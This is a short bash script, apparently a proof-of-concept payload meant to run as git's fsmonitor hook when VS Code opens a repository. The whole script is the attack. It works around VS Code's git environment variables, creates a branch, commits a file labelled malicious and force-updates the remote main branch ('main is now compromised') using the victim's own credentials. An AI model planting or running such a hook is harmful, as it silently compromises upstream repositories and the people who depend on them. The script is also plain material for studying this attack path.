#!/bin/bash
if [ ! -f "../../lock" ] # fsmonitor command may be called multiple times
then
    touch ../../lock
    cd ..
    # we need this 2 lines to prevent git to fail since VSCODE sets GIT_DIR=. and GIT_IMPLICIT_WORK_TREE=0
    export GIT_DIR=.git 
    export GIT_IMPLICIT_WORK_TREE=1
    git checkout origin/main -b hack
    echo 'p0wn' > malicious_file
    git add malicious_file
    git commit -m "malicious file"
    git push origin hack:main # main is now compromised
fi
